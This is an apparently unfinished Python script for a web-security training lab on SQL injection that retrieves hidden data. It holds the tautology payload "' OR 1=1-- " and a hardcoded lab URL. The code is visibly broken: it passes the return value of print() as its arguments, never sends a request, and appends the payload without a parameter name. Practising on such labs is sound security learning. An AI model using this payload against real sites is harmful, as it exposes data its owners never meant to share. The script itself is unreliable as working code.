"""
1. python retrieve-hidden-data.py
2. request the url with our exploit
3. check if solved
"""
import sys
import argparse

import requests


def parse_args(args:list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()

payload = "' OR 1=1-- "
url = 'https://0a2600a20421685cc1da290300a700a0.web-security-academy.net/'

def normalize_url(url):
    if not url.endswith("/"):
        url = url + '/'
    return url

def main(args):
    url = normalize_url(args.url)
    req = f'{url}?{payload}' 

if __name__ == "__main__":
    args = print(parse_args(sys.argv))
    main(args)